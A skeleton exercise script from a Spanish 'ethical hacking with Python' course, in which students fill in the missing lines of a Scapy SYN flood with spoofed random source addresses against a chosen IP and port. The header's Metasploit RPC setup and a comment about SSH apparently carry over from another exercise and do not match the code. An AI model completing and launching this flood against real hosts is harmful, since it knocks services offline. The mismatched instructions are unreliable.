#******************************************************************************************************************
#Curso "Python para hacking ético" Tknika 2022/2023
#RESUMEN DEL SCRIPT:
#Atención: antes de ejecutar el script, tendrás que poner en marcha el servicor RPC desde la consola:#
#    $sudo msfconsole
#    $load msgrpc Pass=python
#    Fíjate bien en el puerto que queda abierto (normalmente, 55552):
#           [*] MSGRPC Service:  127.0.0.1:55552 
#           [*] MSGRPC Username: msf
#           [*] MSGRPC Password: python
#           [*] Successfully loaded plugin: msgrpc
# También tendrás que instalar la librería pymetasploit3 con privilegios:
# Este script realiza un ataque DoS contra el puerto 80 de la IP indicada por el usuario.
# NOTA: ¡Hay que ejecutar el script con privilegios!
#******************************************************************************************************************
from scapy.all import *
import random, ipaddress

#Función para validar si la IP introducida por el usuario es correcta
def validar_destino(direccion_destino):
    try:
        ipaddress.ip_address(direccion_destino)
        return True 
    except ValueError:
        return False

#Función que comprueba si un valor es un puerto válido: está vacío (puerto por defecto) o está entre 1 y 65535
def validar_puerto(puerto):
    try:
        puerto_destino = int(puerto)
        if 1 <= puerto_destino <= 65535:
            return True
        else:
            return False
    except ValueError:
        return False

#Función para solicitar al usuario que introduzca los datos que vamos a necesitar para conectarnos al servidor ssh: IP, puerto de destino, y usuario. 
def solicitar_datos_usuario():
    try:
        destino_correcto=False
        puerto_correcto=False
        while not destino_correcto:
            destino = input('>> Introduce la dirección del host objetivo (IP o nombre de host): ')
            if validar_destino(destino):
                destino_correcto=True
        while not puerto_correcto:
            puerto = input('>> Introduce el puerto sobre el que hacer la inundación: ')
            if validar_puerto(puerto):
                puerto_correcto=True
                
    except ValueError:
        print ("Ha ocurrido un error inesperado...")
    return destino,puerto

#Función para generar una dirección IP aleatoria
def obtener_IP_aleatoria():
    ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
    return ip

#Función para generar un número entero aleatorio entre 1000 y 9000
def obtener_entero_aleatorio():
    numero = random.randint(1000,9000)
    return numero

#Función que genera y envía el número de paquetes indicado por el usuario
##(◕‿−) Introduce las líneas que faltan en la función: 
def SYN_Flood(ip_destino,puerto_destino,contador):
    total = 0
    for x in range (0,contador):
        #(◕‿−)Asignamos valores aleatorios al puerto de origen, número de secuencia y window
        

        #Creamos un objeto de la clase IP de la librería Scapy
        paquete_IP = IP ()

        #(◕‿−)Rellenamos el objeto paquete_IP con:
        #   Dirección IP de origen (src): aleatoria
        #   Dirección IP de destino (dst): la introducida por el usuario
        #    
       

        #Creamos un objeto de la clase IP de la librería Scapy
        paquete_TCP = TCP ()
        #(◕‿−)Rellenamos el objeto paquete_IP con:
        #   Puerto de origen (sport): aleatorio entre 1000 y 9000
        #   Puerto de destino (dport): el introducido por el usuario
        #   Flag (flags(: S (SYN)
        #   Número de secuencia(seq): aleatorio entre 1000 y 9000
        #   Window (window): aleatorio entre 1000 y 9000






        
        #Utilizamos la función send de scapy para enviar el paquete
        send(paquete_IP/paquete_TCP, verbose=0)
        #(◕‿−)Sumamos 1 al número total de paquetes enviados
    #(◕‿−)Imprimimos el número total de paquetes enviados

if __name__ == '__main__':
    try:
        ##(◕‿−)Solicitamos al usuario que introduzca los datos que necesitamos, guardándolos en las variables pertinentes#Solicitamos al usuario que introduzca los datos que necesitamos, guardándolos en las variables pertinentes

        #Pedimos al usuario el número de paquetes a enviar
        numero_paquetes = input ("¿Cuántos paquetes quieres enviar?: ")
        print("Se está efectuando el SYN Flood")
        #(◕‿−)Llamamos a la función SYN_flood pasándole los parámetros oportunos

    except Exception as error:
        print (f"Ha ocurrido un error: {error}")
